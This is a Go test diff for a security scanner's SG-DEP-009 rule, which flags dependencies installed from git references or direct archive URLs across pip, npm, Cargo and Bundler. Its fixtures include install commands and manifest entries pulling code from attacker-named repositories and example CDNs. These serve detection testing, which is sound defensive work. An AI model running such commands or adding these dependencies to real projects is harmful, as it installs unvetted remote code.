@@ -709,6 +709,76 @@ func TestUnpinnedDependencyCovered(t *testing.T) {
 	}
 }
 
+// TestVCSDependencyCovered pins SG-DEP-009 to the "no registry at all" half of
+// the supply-chain family. SG-DEP-008 catches the same package name pulled from
+// the attacker's registry; this catches a dependency that is a git ref or a bare
+// archive URL, so it carries no version resolution, no integrity hash, and no
+// yank path — and a branch reference re-resolves on every install. Benign rows
+// are the ordinary registry installs and the two near-misses that made the
+// leaves narrower: a `"homepage"` field pointing at GitHub, and prose with a
+// bare `@ https://…` that is not a PEP 508 direct reference.
+func TestVCSDependencyCovered(t *testing.T) {
+	packs, _ := Builtin()
+	var r *Rule
+	for _, p := range packs {
+		for _, rr := range p.Rules {
+			if rr.ID == "SG-DEP-009" {
+				r = rr
+			}
+		}
+	}
+	if r == nil {
+		t.Fatal("SG-DEP-009 not found")
+	}
+	cases := []struct {
+		text string
+		want bool
+	}{
+		// pip / uv: VCS reference and direct archive URL.
+		{"pip install git+https://github.com/attacker/helper.git", true},
+		{"pip3 install git+ssh://git@gitlab.example/x/y.git@main", true},
+		{"uv pip install git+https://github.com/a/b", true},
+		{"python -m pip install https://files.example.com/helper-1.0.tar.gz", true},
+		{"pip install https://cdn.example.net/wheels/tool-2.1-py3-none-any.whl", true},
+		// PEP 508 direct reference in a requirements file.
+		{"helper @ git+https://github.com/attacker/helper.git", true},
+		{"tool @ https://files.example.com/tool-1.0.tar.gz", true},
+		// npm family: git shorthand, git+ URL, tarball.
+		{"npm install git+https://github.com/attacker/pkg.git", true},
+		{"npm i github:attacker/pkg", true},
+		{"yarn add https://cdn.example.com/pkg-1.0.0.tgz", true},
+		{"pnpm add gitlab:group/project", true},
+		// Declared in package.json rather than on a command line.
+		{`  "helper": "git+https://github.com/attacker/helper.git"`, true},
+		{`  "tool": "github:attacker/tool#master"`, true},
+		{`  "blob": "https://cdn.example.com/tool-1.0.0.tgz"`, true},
+		// Cargo and Bundler.
+		{"cargo add mycrate --git https://github.com/attacker/mycrate", true},
+		{`mycrate = { git = "https://github.com/attacker/mycrate", branch = "main" }`, true},
+		{`gem 'helper', git: 'https://github.com/attacker/helper.git'`, true},
+
+		// Benign: ordinary registry installs and pinned version specs.
+		{"pip install requests", false},
+		{"pip install -r requirements.txt", false},
+		{"npm install --save-dev typescript", false},
+		{"yarn add react react-dom", false},
+		{"requests==2.31.0", false},
+		{`  "react": "^18.2.0"`, false},
+		{`serde = { version = "1.0", features = ["derive"] }`, false},
+		{`gem 'rails', '~> 7.0'`, false},
+		{"go get github.com/spf13/cobra", false}, // Go's proxy is the registry
+		// Benign near-misses that shaped the leaves.
+		{`  "homepage": "https://github.com/me/proj"`, false},
+		{"Contact the author @ https://example.com/contact", false},
+	}
+	for _, c := range cases {
+		got := len(r.Evaluate("scripts", c.text)) > 0
+		if got != c.want {
+			t.Errorf("%q: got match=%v want %v", c.text, got, c.want)
+		}
+	}
+}
+
 // TestAgentConfigSnoopingCoversReadVariants exercises SG-AS-001 against the
 // read idioms and config locations an agent-config snoop actually uses. The
 // shipped rule had a single leaf — four read verbs plus four path fragments —
